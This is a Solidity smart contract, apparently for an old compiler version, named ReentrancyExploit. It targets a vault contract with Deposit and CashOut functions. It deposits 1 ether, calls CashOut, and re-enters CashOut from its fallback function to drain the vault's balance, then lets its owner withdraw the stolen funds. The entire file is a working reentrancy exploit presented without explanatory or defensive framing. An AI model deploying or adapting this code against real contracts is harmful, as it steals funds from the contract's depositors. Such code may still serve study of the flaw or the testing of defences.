pragma solidity ^0.4.19;

interface IVault {
    function Deposit() external payable;
    function CashOut(uint _am) external;
}

contract ReentrancyExploit {
    IVault public target;
    address public owner;
    uint public attackAmount = 1 ether;
    bool public attackInitiated;

    function ReentrancyExploit(address _target) public {
        target = IVault(_target);
        owner = msg.sender;
    }

    function initiateAttack() public payable {
        require(msg.value >= attackAmount);
        // Deposit into the vault
        target.Deposit.value(attackAmount)();
        // Start the exploit
        attackInitiated = true;
        target.CashOut(attackAmount);
    }

    function() public payable {
        if (attackInitiated && address(target).balance >= attackAmount) {
            // Recursive call to drain more funds
            target.CashOut(attackAmount);
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }
}

